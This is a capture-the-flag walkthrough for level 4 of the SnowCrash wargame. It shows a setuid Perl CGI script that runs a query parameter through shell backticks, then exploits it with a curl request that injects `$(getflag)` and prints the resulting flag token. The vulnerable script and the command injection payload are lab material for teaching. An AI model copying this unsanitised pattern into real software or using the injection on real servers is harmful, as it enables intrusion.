# Level04

## Walkthrough

First, let's check the content of the home directory.

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ file level04.pl 
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```
It looks like the file `level04.pl` is a [Perl](https://en.wikipedia.org/wiki/Perl) script, and as in the last level, the `s` on `level04` permissions indicates the [setuid bit](https://en.wikipedia.org/wiki/Setuid).

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

By analyzing the script, we can quickly understand that it defines a subroutine which receives a parameter and pass it with the `echo` command right after.  
It imports the [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) interface to process HTTP requests, and gets the query parameter `x` which is then passed to the subroutine.
The line `# localhost:4747` could also be a hint: maybe this script is already running on our machine? Let's check that.

```bash
level04@SnowCrash:~$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=2004 but you should be root.)
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::4646                 :::*                    LISTEN      -               
tcp6       0      0 :::4747                 :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::4242                 :::*                    LISTEN      - 
```

That's correct.  
With all the collected information, we can get the current flag by sending a HTTP request to `localhost` on port `4747` with the param `x` set to a command substitution (in our case `getflag`) to run the command during the execution of the Perl script.

```bash
level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
